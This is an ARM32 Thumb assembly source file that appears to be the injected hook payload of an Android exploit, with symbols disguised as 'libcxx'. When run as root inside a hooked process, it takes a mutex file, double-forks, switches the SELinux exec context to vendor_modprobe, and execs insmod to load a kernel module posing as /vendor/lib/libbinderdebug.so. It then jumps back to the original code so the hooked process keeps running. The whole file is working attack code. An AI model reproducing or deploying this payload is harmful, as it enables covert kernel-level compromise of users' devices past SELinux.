    .syntax unified
    .thumb

    .include "include_arm32.inc"

    .global libcxx_start
    .global libcxx_data
    .global libcxx_len
    .global libcxx_first_inst_copy
    .data

libcxx_data:

mutex_file:
    .asciz "/dev/df"
selinux_ctx:
    .asciz "u:r:vendor_modprobe:s0"
selinux_ctx_end:
attr_exec:
    .asciz "/proc/self/attr/exec"
exe_path:
    .asciz "/vendor/bin/insmod"
ko_target:
    .ascii "/vendor/lib/libbinderdebug.so\0"
    .skip 34, 0
    .balign 4
    .global libcxx_ko_target_off
libcxx_ko_target_off:
    .word ko_target - libcxx_data

    .balign 2

libcxx_start:
    @ Save registers (10 regs = 40 bytes, 8-byte aligned)
    push    {r0-r7, r10, lr}

    @ uid == 0?
    mov     r7, #SYS_getuid32
    svc     #0
    cmp     r0, #0
    bne.w   return

    @ openat(AT_FDCWD, "/dev/df", O_CREAT|O_EXCL|O_CLOEXEC, 0)
    @ Non-fatal: crash_dump domain may lack /dev/ write permission.
    @ If it already exists, another caller already hooked — bail out.
    @ If creation fails for other reasons (SELinux), continue anyway.
    mvn     r0, #99
    adr     r1, mutex_file
    movl    r2, (O_CREAT | O_EXCL | O_CLOEXEC)
    movs    r3, #0
    movw    r7, #SYS_openat
    svc     #0
    cmp     r0, #0
    bge     1f
    @ Check if EEXIST (-17): another caller already hooked
    cmn     r0, #17
    beq.w   return
    b       2f
1:
    mov     r7, #SYS_close
    svc     #0
2:

    @ clone(SIGCHLD|CLONE_CHILD_SETTID|CLONE_CHILD_CLEARTID, 0, 0, 0, &ctid)
    sub     sp, sp, #8
    movl    r0, (SIGCHLD | CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID)
    movs    r1, #0
    movs    r2, #0
    movs    r3, #0
    mov     r4, sp
    mov     r7, #SYS_clone
    svc     #0
    add     sp, sp, #8

    cmp     r0, #0
    bne.w   return              @ parent returns to init

    @ ── worker child: fork grandchild for insmod ──
    movs    r0, #SIGCHLD
    movs    r1, #0
    movs    r2, #0
    movs    r3, #0
    movs    r4, #0
    mov     r7, #SYS_clone
    svc     #0
    cmp     r0, #0
    bne     myexit

    @ ── grandchild: set SELinux exec ctx, execve insmod ──
    @ openat(AT_FDCWD, "/proc/self/attr/exec", O_WRONLY|O_CLOEXEC)
    mvn     r0, #99
    adr     r1, attr_exec
    movl    r2, (O_WRONLY | O_CLOEXEC)
    movw    r7, #SYS_openat
    svc     #0
    mov     r10, r0             @ save fd in r10

    @ write(fd, selinux_ctx, len)
    mov     r0, r10
    adr     r1, selinux_ctx
    movs    r2, #(selinux_ctx_end - selinux_ctx)
    mov     r7, #SYS_write
    svc     #0

    @ close(fd)
    mov     r0, r10
    mov     r7, #SYS_close
    svc     #0

    @ execve("/vendor/bin/insmod", [exe_path, ko_target, NULL], NULL)
    sub     sp, sp, #12
    adr     r1, exe_path
    str     r1, [sp, #0]
    adr     r1, ko_target
    str     r1, [sp, #4]
    movs    r1, #0
    str     r1, [sp, #8]

    adr     r0, exe_path
    mov     r1, sp
    movs    r2, #0
    mov     r7, #SYS_execve
    svc     #0

myexit:
    movs    r0, #1
    mov     r7, #SYS_exit
    svc     #0

return:
    pop     {r0-r7, r10, lr}
libcxx_first_inst_copy:
    nop.w                       @ overwritten: saved first Thumb2 instruction
    b.w     end                 @ overwritten: B.W jump-back to hook_off+4
end:

libcxx_end:
libcxx_len:
    .word libcxx_end - libcxx_data
